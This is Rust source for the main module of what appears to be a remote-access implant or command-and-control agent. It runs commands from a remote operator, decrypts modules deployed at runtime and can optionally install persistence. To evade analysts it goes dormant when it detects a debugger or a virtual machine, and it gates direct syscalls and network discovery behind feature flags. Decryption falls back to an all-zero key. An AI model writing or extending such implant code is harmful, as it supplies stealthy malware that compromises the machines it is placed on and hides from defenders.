pub mod config;
pub mod env_check;
pub mod fsops;
pub mod handlers;
pub mod process_manager;
pub mod shell;

#[cfg(feature = "outbound-c")]
pub mod outbound;

#[cfg(feature = "persistence")]
pub mod persistence;

#[cfg(feature = "network-discovery")]
pub mod net_discovery;

#[cfg(feature = "remote-assist")]
pub mod remote_assist;

#[cfg(feature = "hci-research")]
pub mod hci_logging;

#[cfg(all(windows, feature = "direct-syscalls"))]
pub mod syscalls;

use anyhow::Result;
use common::{config::Config, CryptoSession, Message, Transport};
use log::{error, info};
use std::sync::Arc;
use tokio::sync::Mutex;

pub struct Agent {
    transport: Arc<Mutex<Box<dyn Transport + Send>>>,
    config: Arc<Mutex<Config>>,
    /// AES-256-GCM session used to decrypt capability modules deployed at
    /// runtime. Derived from the `module_signing_key` in `agent.toml`, or
    /// a zero key when not configured (development only).
    crypto: Arc<CryptoSession>,
}

impl Agent {
    pub fn new(transport: Box<dyn Transport + Send>) -> Result<Self> {
        let cfg = config::load_config()?;

        // Derive the module-decryption key from configuration.
        // In production this key must be set in agent.toml.
        let crypto_key: [u8; 32] = if let Some(ref b64) = cfg.module_signing_key {
            use base64::Engine;
            let bytes = base64::engine::general_purpose::STANDARD
                .decode(b64)
                .unwrap_or_else(|_| vec![0u8; 32]);
            let mut key = [0u8; 32];
            let len = bytes.len().min(32);
            key[..len].copy_from_slice(&bytes[..len]);
            key
        } else {
            [0u8; 32] // insecure default; fine for development
        };

        Ok(Self {
            transport: Arc::new(Mutex::new(transport)),
            config: Arc::new(Mutex::new(cfg)),
            crypto: Arc::new(CryptoSession::from_key(crypto_key)),
        })
    }

    pub async fn run(&mut self) -> Result<()> {
        // Trusted Execution Environment Enforcement (env_check.rs):
        // refuse to start under a debugger or on the wrong domain.
        {
            let cfg = self.config.lock().await;
            let decision = env_check::enforce(cfg.required_domain.as_deref(), cfg.refuse_in_vm);
            if decision.refuse {
                error!(
                    "environment validation failed (debugger={}, vm={}, domain_match={:?}); agent entering dormant state",
                    decision.report.debugger_present,
                    decision.report.vm_detected,
                    decision.report.domain_match,
                );
                // Dormant state: sleep forever instead of exiting, so process
                // supervisors do not restart us in a tight loop.
                loop {
                    tokio::time::sleep(std::time::Duration::from_secs(3600)).await;
                }
            } else {
                info!(
                    "environment validation passed (debugger={}, vm={}, domain_match={:?})",
                    decision.report.debugger_present,
                    decision.report.vm_detected,
                    decision.report.domain_match,
                );
            }
        }

        // Optimize hot functions at startup
        optimizer::optimize_hot_functions();

        // Honour opt-in persistence (Prompt H).
        #[cfg(feature = "persistence")]
        {
            let cfg = self.config.lock().await;
            if cfg.persistence_enabled {
                match persistence::install_persistence() {
                    Ok(p) => info!("Persistence installed at {}", p.display()),
                    Err(e) => error!("Failed to install persistence: {e}"),
                }
            }
        }

        info!("Agent started, waiting for commands...");
        loop {
            let msg = {
                let mut transport = self.transport.lock().await;
                transport.recv().await
            };
            match msg {
                Ok(Message::TaskRequest {
                    task_id,
                    command,
                    operator_id,
                }) => {
                    info!("Received command: {:?}", command);
                    let crypto = self.crypto.clone();
                    let config = self.config.clone();
                    let transport = self.transport.clone();
                    tokio::spawn(async move {
                        let (response, audit_event) = handlers::handle_command(
                            crypto,
                            config,
                            command,
                            operator_id.as_deref().unwrap_or("admin"),
                        )
                        .await;
                        let mut t = transport.lock().await;
                        if let Err(e) = t.send(Message::AuditLog(audit_event)).await {
                            error!("Failed to send audit log: {}", e);
                        }
                        if let Err(e) = t
                            .send(Message::TaskResponse {
                                task_id,
                                result: response,
                            })
                            .await
                        {
                            error!("Failed to send response: {}", e);
                        }
                    });
                }
                Ok(Message::Shutdown) => {
                    info!("Shutdown received, exiting.");
                    break;
                }
                Ok(_) => {} // ignore heartbeats etc.
                Err(e) => {
                    error!("Transport error: {}", e);
                    // Return the error so the caller (e.g. outbound reconnect
                    // loop) can detect disconnection and re-establish the
                    // session, rather than spinning forever on a dead socket.
                    return Err(e);
                }
            }
        }
        Ok(())
    }
}
